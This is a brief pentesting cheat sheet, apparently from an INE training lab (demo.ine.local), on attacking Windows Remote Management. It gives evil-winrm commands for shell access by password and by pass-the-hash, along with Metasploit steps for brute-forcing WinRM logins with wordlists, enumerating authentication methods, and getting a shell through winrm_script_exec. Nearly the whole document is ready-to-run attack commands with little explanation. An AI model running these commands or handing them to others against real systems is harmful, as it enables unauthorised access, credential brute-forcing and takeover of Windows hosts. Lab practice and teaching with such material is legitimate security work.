# WinRM

---

#### Manual Exploitation


"evil-winrm" enables us a command shell session on the target system.

```
evil-winrm -i <target_ip> -u administrator -p 'password123' 
```

```
evil-winrm -i <target_ip> -u Administrator -H 6bc99ede9edcfecf9662fb0c0ddcfa7a
```

crackmapexec can bruteforce winrm


#### Brute-Forcing with Metasploit

msfconsole -q
use auxiliary/scanner/winrm/winrm_login
set RHOSTS demo.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
set PASSWORD anything
exploit

#### Enumerating Authentification Method using Metasploit

msfconsole -q
use auxiliary/scanner/winrm/winrm_auth_methods
set RHOSTS demo.ine.local
exploit

#### Getting Shell with Metasploit

use exploit/windows/winrm/winrm_script_exec
set RHOSTS demo.ine.local
set USERNAME administrator
set PASSWORD tinkerbell
set FORCE_VBS true
exploit
